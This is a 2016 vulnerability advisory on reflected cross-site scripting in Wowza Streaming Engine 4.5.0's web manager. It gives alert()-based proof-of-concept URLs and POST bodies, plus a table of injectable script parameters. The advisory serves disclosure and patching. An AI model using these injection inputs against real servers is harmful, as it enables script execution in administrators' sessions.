@@ -1,0 +1,117 @@
+﻿
+Wowza Streaming Engine 4.5.0 Multiple Cross-Site Scripting Vulnerabilities
+
+
+Vendor: Wowza Media Systems, LLC.
+Product web page: https://www.wowza.com
+Affected version: 4.5.0 (build 18676)
+Platform: JSP
+
+Summary: Wowza Streaming Engine is robust, customizable, and scalable
+server software that powers reliable video and audio streaming to any
+device. Learn the benefits of using Wowza Streaming Engine to deliver
+high-quality live and on-demand video content to any device.
+
+Desc: Wowza Streaming Engine suffers from multiple reflected cross-site
+scripting vulnerabilities when input passed via several parameters to
+several scripts is not properly sanitized before being returned to the
+user. This can be exploited to execute arbitrary HTML and script code
+in a user's browser session in context of an affected site.
+
+Tested on: Winstone Servlet Engine v1.0.5
+           Servlet/2.5 (Winstone/1.0.5)
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2016-5343
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2016-5343.php
+
+
+03.07.2016
+
+--
+
+
+http://localhost:8088/enginemanager/applications/live/main/view.htm?vhost=_defaultVHost_&appName=live<script>alert(1)</script>
+http://localhost:8088/enginemanager/applications/monitoring/historical.jsdata?vhost=_defaultVHost_&appName=test&periodStart=2016-07-03T13%3A42%3A32%2B02%3A00&periodEnd=2016-07-03T14%3a42%3a32%2b02%3a00<script>alert(2)</script>
+http://localhost:8088/enginemanager/applications/monitoring/historical.jsdata?vhost=_defaultVHost_&appName=test&periodStart=2016-07-03T13%3a42%3a32%2b02%3a00<script>alert(3)</script>&periodEnd=2016-07-03T14%3A42%3A32%2B02%3A00
+http://localhost:8088/enginemanager/applications/liveedge/securityplayback/edit.htm?appName=test<script>alert(4)</script>&vhost=_defaultVHost_
+
+---
+
+POST /enginemanager/applications/liveedge/main/edit.htm
+Host: localhost:8088
+
+vhost=_defaultVHost_";alert(5)//&uiAppName=test&uiAppType=Live%20Edge%20Application<script>alert(6)</script>&section=main&version=1467548313123&action=new&description=desctest&mpegDash=true&_mpegDash=on&appleHLS=true&_appleHLS=on&adobeRTMP=true&_adobeRTMP=on&adobeHDS=true&_adobeHDS=on&msSmooth=true
+
+---
+
+POST /enginemanager/applications/liveedge/publishers/encoder/PANASONIC_CAMCORDER.htm
+Host: localhost:8088
+
+vhost=_defaultVHost_&uiAppName=test";alert(7)//&uiAppType=Live+Edge+Application&instanceName=";alert(8)//&section=publishers_panasonic_camcorder";alert(9)//&version=0&driverName=Panasonic&publishersStreamFileName=panasonicstreamname&cameraIpAddress=1.1.1.1&appType=liveedge";alert(10)//&appName=test
+
+---
+
+POST /enginemanager/applications/liveedge/securityplayback/edit.htm HTTP/1.1
+Host: localhost:8088
+
+vhost=_defaultVHost_";alert(11)//&uiAppName=test&uiAppType=Live%20Edge%20Application<script>alert(12)</script>&section=securityplayback&version=1467549110876&_requireSecureRTMPConnection=on&secureTokenState=Protect+all+protocols+using+hash+(SecureToken+version+2)&sharedSecret=sharedtestsecret&hashAlgorithm=SHA
+
+---
+
+POST /enginemanager/applications/liveedge/streamtarget/add.htm HTTP/1.1
+Host: localhost:8088
+
+enabled=true&protocol=RTMP&destinationName=akamai&destApplicationRequired=false&destAppInstanceRequired=false&usernameRequired=true&passwordRequired=true&wowzaCloudDestinationType=1*/alert(13)//&facebookAccessToken=&facebookDestName=&facebookDestId=&facebookEventSourceName=&wowzaDotComFacebookUrl=https%3A%2F%2Ffb.wowza.com%2Fwsem%2Fstream_targets%2Fv1&connectionCode=&protocolShoutcast=Shoutcast
+
+---
+
+-------------------------------------------------------------------------------------------------------------------
+|                                  Script                                        |            Parameter           |
+-------------------------------------------------------------------------------------------------------------------
+                                                                                 |                                |
+/enginemanager/applications/live/main/view.htm                                   |    appName                     |
+/enginemanager/applications/liveedge/main/edit.htm                               |    uiAppType                   |
+/enginemanager/applications/liveedge/main/edit.htm                               |    vhost                       |
+/enginemanager/applications/liveedge/publishers/encoder/PANASONIC_CAMCORDER.htm  |    appType                     |
+/enginemanager/applications/liveedge/publishers/encoder/PANASONIC_CAMCORDER.htm  |    instanceName                |
+/enginemanager/applications/liveedge/publishers/encoder/PANASONIC_CAMCORDER.htm  |    section                     |
+/enginemanager/applications/liveedge/publishers/encoder/PANASONIC_CAMCORDER.htm  |    uiAppType                   |
+/enginemanager/applications/liveedge/securityplayback/edit.htm                   |    appName                     |
+/enginemanager/applications/liveedge/securityplayback/edit.htm                   |    uiAppType                   |
+/enginemanager/applications/liveedge/securityplayback/edit.htm                   |    vhost                       |
+/enginemanager/applications/liveedge/streamtarget/add.htm                        |    wowzaCloudDestinationType   |
+/enginemanager/applications/liveedge/streamtarget/wizard.htm                     |    appName                     |
+/enginemanager/applications/liveedge/streamtarget/wizard.htm                     |    vhost                       |
+/enginemanager/applications/monitoring/historical.jsdata                         |    periodEnd                   |
+/enginemanager/applications/monitoring/historical.jsdata                         |    periodStart                 |
+/enginemanager/applications/new.htm                                              |    uiAppName                   |
+/enginemanager/server/mediacachesource/edit.htm                                  |    action                      |
+/enginemanager/server/mediacachesource/edit.htm                                  |    maxTTLDays                  |
+/enginemanager/server/mediacachesource/edit.htm                                  |    maxTTLHours                 |
+/enginemanager/server/mediacachesource/edit.htm                                  |    maxTTLMinutes               |
+/enginemanager/server/mediacachesource/edit.htm                                  |    maxTTLSeconds               |
+/enginemanager/server/mediacachesource/edit.htm                                  |    minTTLDays                  |
+/enginemanager/server/mediacachesource/edit.htm                                  |    minTTLHours                 |
+/enginemanager/server/mediacachesource/edit.htm                                  |    minTTLMinutes               |
+/enginemanager/server/mediacachesource/edit.htm                                  |    minTTLSeconds               |
+/enginemanager/server/mediacachestore/edit.htm                                   |    action                      |
+/enginemanager/server/transcoderencode/edit.htm                                  |    action                      |
+/enginemanager/server/transcoderencode/edit.htm                                  |    appType                     |
+/enginemanager/server/transcoderencode/edit.htm                                  |    templateName                |
+/enginemanager/server/vhost/streamfile/new.htm                                   |    streamName                  |
+/enginemanager/transcoder/new.htm                                                |    appType                     |
+/enginemanager/transcoder/new.htm                                                |    dstTemplate                 |
+/enginemanager/applications/monitoring/app.jsdata                                |    appName                     |
+/enginemanager/applications/monitoring/historical.jsdata                         |    appName                     |
+/enginemanager/applications/monitoring/historical.jsdata                         |    vhost                       |
+/enginemanager/server/logs/getlog.jsdata                                         |    filter                      |
+/enginemanager/server/logs/getlog.jsdata                                         |    logMode                     |
+/enginemanager/server/logs/getlog.jsdata                                         |    logName                     |
+/enginemanager/server/logs/getlog.jsdata                                         |    logType                     |
+                                                                                 |                                |
+---------------------------------------------------------------------------------|--------------------------------|
